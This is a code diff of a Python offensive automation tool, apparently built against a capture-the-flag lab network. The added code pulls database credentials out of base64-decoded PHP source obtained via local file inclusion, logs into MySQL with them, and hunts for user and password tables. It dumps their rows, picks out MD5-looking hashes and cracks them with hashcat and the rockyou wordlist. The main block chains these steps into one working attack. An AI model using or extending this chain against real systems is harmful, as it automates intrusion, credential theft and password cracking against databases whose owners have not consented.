@@ -10,11 +10,21 @@ from selenium import webdriver
 from colorama import Fore, Style, init
 import time
 import base64
+import re
+import mysql.connector
+import subprocess
 
-ip_1 = "10.10.143.101"
-ip_2 = "10.10.143.102"
+
+ip_1 = "10.10.147.69"
+ip_2 = "10.10.147.70"
+users = []
+password = []
 credentials = []
-services = []
+hashes = []
+mysql_data = []
+valid_credential_to_service = []
+#test data, program will scrap availble services from nmap results
+services = [{'ip': '10.10.131.118', 'port': '53', 'service': 'domain'}, {'ip': '10.10.131.118', 'port': '80', 'service': 'http'}, {'ip': '10.10.131.118', 'port': '88', 'service': 'kerberos-sec'}, {'ip': '10.10.131.118', 'port': '135', 'service': 'msrpc'}, {'ip': '10.10.131.118', 'port': '139', 'service': 'netbios-ssn'}, {'ip': '10.10.131.118', 'port': '389', 'service': 'ldap'}, {'ip': '10.10.131.118', 'port': '443', 'service': 'https'}, {'ip': '10.10.131.118', 'port': '445', 'service': 'microsoft-ds'}, {'ip': '10.10.131.118', 'port': '464', 'service': 'kpasswd5'}, {'ip': '10.10.131.118', 'port': '593', 'service': 'http-rpc-epmap'}, {'ip': '10.10.131.118', 'port': '636', 'service': 'ldapssl'}, {'ip': '10.10.131.118', 'port': '3268', 'service': 'globalcatLDAP'}, {'ip': '10.10.131.118', 'port': '3269', 'service': 'globalcatLDAPssl'}, {'ip': '10.10.147.70', 'port': '3306', 'service': 'mysql'}]
 run_in_background = []
 found_web_directories = []
 links = []
@@ -56,6 +66,19 @@ class WebFuzzing:
         self.ip = ip
         self.thread_count = thread_count
         self.stop_fuzzing = False
+
+    def extract_credentials_from_dict(self, data: dict, keywords=None):
+        if keywords is None:
+            keywords = ["username", "password", "user", "passwd", "server", "host", "db", "database", "port"]
+        credentials_found = []
+        for value in data.values():
+            #Use regex to find PHP variable assignments
+            matches = re.findall(r'\$(\w+)\s*=\s*[\'"]([^\'"]+)[\'"]', str(value))
+            for var, val in matches:
+                if var.lower() in keywords:
+                    credentials_found.append({var: val})
+        return credentials_found
+
 
     def check_directory(self, url):
         # Sends a HEAD request to check if the directory exists or is accessible
@@ -190,23 +213,197 @@ class WebFuzzing:
                     print(f"Decoded Base64 String (truncated): {decoded[:100]}")
                     base64_content["Encoded"] = text
                     base64_content["Decoded"] = decoded
-            
+        creds = self.extract_credentials_from_dict(base64_content)
+        credentials.append(creds)
+        print(credentials)
 
-class WebExploitation:
+class Services:
     def __init__(self, ip):
         self.ip = ip
 
-    # exploiting PHP filter
+    def credential_stuffing(self):
+        some_variable = ['username', 'password']
+        credentials_to_use = {
+            "password": '',
+            "username": '',
+        }
+        # credentials is a list of lists of dicts: [[{'username': 'root'}, {'password': 'SuperSecureMySQLPassw0rd1337.'}]]
+        for entry in credentials:
+            for item in entry:
+                for key in some_variable:
+                    if key in item:
+                        credentials_to_use[key] = item[key]
+        print("Collected credentials to use:", credentials_to_use)
+        #test print
+        print(services)
+        self.mysql_connect(credentials_to_use)
+
+    def mysql_connect(self, credential: dict):
+        global valid_credential_to_service
+        mysql_dict = next((d for d in services if d.get('service') == 'mysql'), None)
+        #test print
+        print(mysql_dict)
+        try:
+            connection_string = mysql.connector.connect(
+                host = mysql_dict["ip"],
+                port = mysql_dict["port"],
+                user = credential["username"],
+                password = credential["password"],
+            )
+            if connection_string.is_connected():
+                print("MySQL Connection Successful")
+                valid_credential_to_service.append({
+                    "service": mysql_dict['service'],
+                    "ip": mysql_dict['ip'],
+                    'port': mysql_dict['port'],
+                    'username': credential['username'],
+                    'password': credential['password']
+                })
+                last_valid = valid_credential_to_service[-1]
+                print(f"valid credentials for {last_valid["service"]} with {last_valid['username']}:{last_valid['password']}")
+                
+                
+            else:
+                print("MySQL connection failed")
+        except mysql.connector.Error as e:
+            print(f"Error: {e}")
+        
+
+    def mysql_interaction(self):
+        mysql_connection_data = next((d for d in valid_credential_to_service if d.get('service') == 'mysql'), None)
+        connection_string = mysql.connector.connect(
+            host = mysql_connection_data['ip'],
+            port = mysql_connection_data['port'],
+            user = mysql_connection_data['username'],
+            password = mysql_connection_data['password']
+        )
+        try:
+            if connection_string.is_connected():
+                cursor = connection_string.cursor()
+                print("is connected")
+                cursor.execute("SHOW DATABASES")
+                databases = cursor.fetchall()
+                cursor.close()
+                keywords = ['user', 'password', 'hash', 'users']
+                interesting_table = []
+                preconfiqured_dbs = ['mysql', 'performance_schema', 'information_schema', 'sys']
+                exclude_preconfigured_dbs = True
+                for db in databases:
+                    db_name = db[0]
+                    if exclude_preconfigured_dbs and db_name in preconfiqured_dbs:
+                        continue
+                    connection_string = mysql.connector.connect(
+                    host = mysql_connection_data['ip'],
+                    port = mysql_connection_data['port'],
+                    user = mysql_connection_data['username'],
+                    password = mysql_connection_data['password'],
+                    database = db_name
+                    )
+                    db_cursor = connection_string.cursor()
+                    db_cursor.execute("SHOW TABLES")
+                    db = db_cursor.fetchall()
+                    for tables in db:
+                        if tables[0] in keywords:
+                            interesting_table.append({"database": db_name, "table": tables[0]})
+                    #print(results)
+                #print(interesting_table)
+                hunting_keywords = ['password', 'passwd', 'hash', 'user']
+                all_table_data = []
+                for entry in interesting_table:
+                    db_name = entry['database']
+                    table_name = entry['table']
+                    #Connect to the database
+                    connection_string = mysql.connector.connect(
+                        host = mysql_connection_data['ip'],
+                        port = mysql_connection_data['port'],
+                        user = mysql_connection_data['username'],
+                        password = mysql_connection_data['password'],
+                        database = db_name
+                    )
+                    cursor = connection_string.cursor()
+                    # get columns names
+                    cursor.execute(f"SHOW COLUMNS FROM `{table_name}`")
+                    columns = [col[0] for col in cursor.fetchall()]
+                    #if any columns matches a keyword, fetch all columns in the coresponding table
+                    if any(any(k in col.lower() for k in hunting_keywords) for col in columns):
+                        cursor.execute(f"SELECT * FROM `{table_name}`")
+                        rows = cursor.fetchall()
+                        #get column names from the cursor description
+                        col_names = [desc[0] for desc in cursor.description]
+                        #build a list of dicts: each dict is a row with the columns as keys
+                        table_data = [dict(zip(col_names, row)) for row in rows]
+                        #Save the tables data, columns, and source database for later use
+                        all_table_data.append({
+                            "database": db_name,
+                            "table": table_name,
+                            "columns": col_names,
+                            "rows": table_data
+                        })
+                        #print summary and each row for review
+                        print(all_table_data)
+                        mysql_data = pd.DataFrame(rows, columns=col_names)
+                        hash_functions = Hashes(mysql_data)
+                        hash_functions.extract_hash_from_data()
+                        print(mysql_data)
+                        print(hashes)
+                    
+        except mysql.connector.Error as e:
+            print(f"The following error has occured: {e}")
+
+class Hashes:
+    def __init__(self, data: dict):
+        self.data = data
+        
+
+    def extract_hash_from_data(self):
+        if "password" in self.data:
+            password_value = self.data['password'].tolist()
+            for password in password_value:
+                if self.most_likely_hash(password):
+                    hashes.append(password)
+                    print(password)
             
-
-        
-
-        
                     
 
+    def most_likely_hash(self, hash):
+        # for now we want to check if these possible hashs contain 32 hex characters
+        if isinstance(hash, str) and re.fullmatch(r'[a-fA-F0-9]{32}', hash.strip()):
+            print(f"Most likely a md5 or md4 hash: {hash}")
+            return hash
+        else:
+            print("not hash")
+            return False
+
+    @staticmethod
+    def hashcat_md5(hashes_to_crack, wordlist="/usr/share/wordlists/rockyou.txt"):
+        #write hashes to a txt file
+        hash_file = "hashes.txt"
+        with open(hash_file, 'w') as f:
+            for h in hashes_to_crack:
+                f.write(h + "\n")
+        #build the command
+        subprocess.run (['hashcat', '-a', '0', '-m',  '0', hash_file, wordlist], capture_output=True, text=True)
+        # retrieve cracked password using hashcats --show 
+        result = subprocess.run(['hashcat', '-a', '0', '-m', '0', hash_file, wordlist, '--show'], capture_output=True, text=True)
+        print(result.stdout)
+        print(result.stderr)
+        try:
+            for line in result.stdout.strip().split('\n'):
+                if ':' in line:
+                    cracked = line.split(':', 1)[1]
+                    password.append(cracked)
+                    print(f"Cracked password added: {cracked}")  
+        except Exception as e:
+            print(f"The following error has occured: {e}")
         
 
-    
+
+        
+
+
+
+
+
 
 if __name__ == "__main__":
     #scanner = Scanner(ip=ip_2)
@@ -217,6 +414,12 @@ if __name__ == "__main__":
     test_lfi.locate_lfi('/dev')
     test_lfi.test_lfi('./lfi_payload')
     test_lfi.test_php_filter('DB.php')
+    test_credential = Services(ip_2)
+    test_credential.credential_stuffing()
+    test_credential.mysql_interaction()
+    hash_functions = Hashes(hashes)
+    hash_functions.extract_hash_from_data()
+    hash_functions.hashcat_md5(hashes)
     
 
     
